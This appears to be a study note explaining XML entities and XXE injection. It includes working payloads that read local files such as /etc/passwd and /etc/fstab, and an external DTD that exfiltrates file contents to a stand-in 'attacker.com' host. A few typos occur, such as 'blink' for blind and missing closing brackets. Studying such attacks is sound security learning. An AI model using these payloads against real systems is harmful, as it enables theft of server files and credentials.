# XML External Entities

XML is about data transportation and sometimes storage

Use in API, UIs, config files and RSS feeds.

``` xml
<?xml version="1.0"?> <!-- xml metadata-->
<Person>
<Name>John</Name>
<Age>20</Age>
</Person>
```

Tag names are case sensitive
`<>"'` are not allowed in the document directly because XML parsers will have trouble interpreting it correctly

## Entities

**Entities** are like variables for XML. You can assign a value to it an use it multiple times in the document. They are are declared in **Document Type Defintion (DTD)**

``` xml
<!DOCTYPE Person [
    <!ENTITY name "John">
]>
<Person>
    <Name>&name;</Name>
    <Age>20</Age>
</Person>
```

There are many types of entities

* internal - defined within local DTD.

    ``` dtd
    <!DOCTYPE doc [
        <!ENTITY foo "bar">
    ]>
    ```

    Can be referred to within the XML as `&foo;` and will be replaced with the term "bar"
* external - defined outside of local DTD

    ``` dtd
    <!ENTITY foo SYSTEM "file:///external.dtd">
    ```

* parameter - only allowed inside DTD. Is used with the `%` symbol  
E.g. creating an entity whose value is another entity

    ``` xml
    <!DOCTYPE Person [
        <!ENTITY % outer "<!ENTITY inner 'John'>">
    ]>
    ```

* predefined - a set of predefined values of special characters

    ``` xml
    <hello>&#x3C;</hello>
    ```

Entities can

* store values we specify
* pull values from a local files
* fetch remote data over the network and store them as entities

``` xml
<?xml version="1.0"?>
<!DOCTYPE XXE [
    <!ENTITY subscribe SYSTEM "secret.txt">
    <!-- SYSTEM lets the entity know the XML parser know that the entity is external -->
    <!-- It stores the contents of "secret.txt" into subscribe -->
]>
<pwn>&subscribe;</pwn>
```

There are different types of XXE's; inband, error, out-of-band (OOB)

* inband - the XML will be parsed and the output will be shown on the screen
* error - a blink XXE, where you basically see a bunch of errors
* OOB - xml is parsed, but you can't see the output

## External Document Type Definitions

``` xml
<!-- main.xml -->
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
<data>&send;</data>
```

``` xml
<!-- evil.dtd -->
<!ENTITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'>">
%wrapper;

<!-- This is interpreted as
<!ENTITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY %wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'>">
<!ENTITY send SYSTEM 'http://attacker.com/?CONTENTS_OF_PASSWD>
-->
```

If a file contains non "well-formed" tags, e.g. `<p></p>`, they need to be enclosed with CDATA. Whatever is in between the opening and closing CDATA is will not be parsed as markup by the XML parser. e.g `<text>` is ignored in `<![CDATA[ <text> ]]>`.

The value of a CDATA entity has to be well-formed so we cannot do the following

``` xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY start "<![CDATA[">
<!ENTITY file SYSTEM "file:///etc/fstab">
<!ENTITY end "]]">
]>
<data>&start;&file;&end;</data>
```

The solution to this is using parameter entities and external DTDs

``` xml
<!-- external.dtd -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % end "]]">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>"
%wrapper;
```

For more possible XXE payloads see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
